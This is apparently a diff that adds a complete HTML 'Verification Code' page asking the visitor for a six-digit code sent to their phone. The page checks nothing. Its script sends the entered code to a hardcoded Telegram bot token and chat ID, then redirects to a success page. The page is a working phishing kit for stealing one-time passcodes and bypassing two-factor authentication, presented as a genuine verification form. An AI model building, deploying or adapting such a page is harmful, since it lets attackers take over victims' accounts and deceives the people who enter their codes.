@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verification Code</title>
+
+  <style>
+    :root {
+      --bg-page: #f4f5f7;
+      --bg-panel: #ffffff;
+      --border-light: #e1e3e6;
+      --text-main: #222;
+      --accent-blue: #0070f3;
+      --error-red: #dc2626;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text",
+        system-ui, sans-serif;
+    }
+
+    body {
+      background: var(--bg-page);
+    }
+
+    .wrapper {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .box {
+      background: var(--bg-panel);
+      width: 100%;
+      max-width: 420px;
+      padding: 28px 22px 32px;
+      border-radius: 18px;
+      box-shadow: 0 8px 24px rgba(15, 23, 42, 0.08);
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+
+    .sub {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 26px;
+    }
+
+    .otp-box {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+
+    .otp-input {
+      width: 48px;
+      height: 54px;
+      text-align: center;
+      font-size: 22px;
+      border-radius: 8px;
+      border: 1px solid var(--border-light);
+      outline: none;
+      transition: 0.15s ease;
+      background: #fff;
+    }
+
+    .otp-input:focus {
+      border-color: var(--accent-blue);
+      box-shadow: 0 0 0 1px rgba(0,112,243,0.18);
+    }
+
+    .error {
+      color: var(--error-red);
+      font-size: 12px;
+      margin-bottom: 8px;
+      display: none;
+    }
+
+    .btn {
+      width: 100%;
+      background: var(--accent-blue);
+      border: none;
+      padding: 12px 0;
+      font-size: 16px;
+      font-weight: 600;
+      color: #fff;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.15s ease;
+    }
+
+    .btn:hover {
+      background: #0060d0;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="box">
+
+      <h1>Verification Code</h1>
+      <div class="sub">Enter the 6-digit code sent to your number</div>
+
+      <form id="otpForm" onsubmit="return false;">
+        <div class="otp-box">
+          <input id="d1" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
+          <input id="d2" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
+          <input id="d3" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
+          <input id="d4" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
+          <input id="d5" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
+          <input id="d6" maxlength="1" class="otp-input" type="text" inputmode="numeric" />
+        </div>
+
+        <div id="err" class="error">All fields are required.</div>
+
+        <button class="btn" id="verifyBtn">Verify</button>
+      </form>
+
+    </div>
+  </div>
+
+  <script>
+    const boxes = ["d1", "d2", "d3", "d4", "d5", "d6"].map(id => document.getElementById(id));
+    const err = document.getElementById("err");
+
+    // auto move
+    boxes.forEach((box, idx) => {
+      box.addEventListener("input", () => {
+        if (box.value.length === 1 && idx < 5) boxes[idx + 1].focus();
+      });
+    });
+
+    document.getElementById("verifyBtn").addEventListener("click", function () {
+      const values = boxes.map(b => b.value.trim());
+
+      if (values.includes("")) {
+        err.style.display = "block";
+        return;
+      }
+
+      err.style.display = "none";
+
+      const code = values.join("");
+
+      const message =
+        "🔐 OTP Verification\n" +
+        "------------------------\n" +
+        "✔ Code entered: " + code;
+
+      const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
+      const chatId = "7811430582";
+
+      fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(r => r.json())
+      .then(data => {
+        console.log("Telegram response:", data);
+        window.location.href = "success.html";
+      })
+      .catch(err => {
+        console.error("Telegram Error:", err);
+        alert("Something went wrong. Try again.");
+      });
+    });
+  </script>
+</body>
+</html>
